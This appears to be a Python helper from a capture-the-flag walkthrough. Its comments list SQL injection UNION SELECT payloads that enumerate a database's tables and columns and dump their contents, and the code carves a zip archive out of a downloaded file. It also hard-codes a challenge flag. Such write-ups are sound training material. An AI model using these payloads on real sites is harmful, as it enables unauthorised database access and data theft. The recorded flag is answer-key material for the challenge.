# 1 UNION SELECT NULL, CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
# -> images, list_images
# 1 UNION SELECT NULL, CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database()
# -> id86, urle9, downloadsbb, title07, comment8f
# -> id, url, title, comment
# 1 UNION SELECT NULL, CONCAT(id86, urle9, downloadsbb, title07, comment8f) FROM images
# -> Flag11, use 16 leftmost characters of the Cookie Tampering Flag09 and download the file f2cbd141d53e99b5ef4beb65a02889c5.bin
# Ran this script to convert the downloaded file to a zip file. It had a password
# Downloaded youthfully.png
# Cloned git@github.com:raffg/steganography.git (the original image was actually stolen from the README here)
# Used the command: python3 steganography.py youthfully.png

from constants import SUPPORT


FLAG11 = "ad86e9078fbbf6cbec1815d405ffb028"
BIN_FILENAME = "f2cbd141d53e99b5ef4beb65a02889c5.bin"
PICTURE_FILENAME = "youthfully.png"

INFILE = SUPPORT / "download"
OUTFILE = SUPPORT / "download.zip"


def extract_zip_file() -> None:
    with INFILE.open("rb") as file:
        data = file.read()

    start_idx = data.find(b"PK\x03\x04")

    if (end_idx := data.rfind(b"PK\x05\x06")) != -1:
        data = data[start_idx : end_idx + 22]

    with OUTFILE.open("wb") as file:
        file.write(data)


def main() -> None:
    extract_zip_file()


if __name__ == "__main__":
    main()
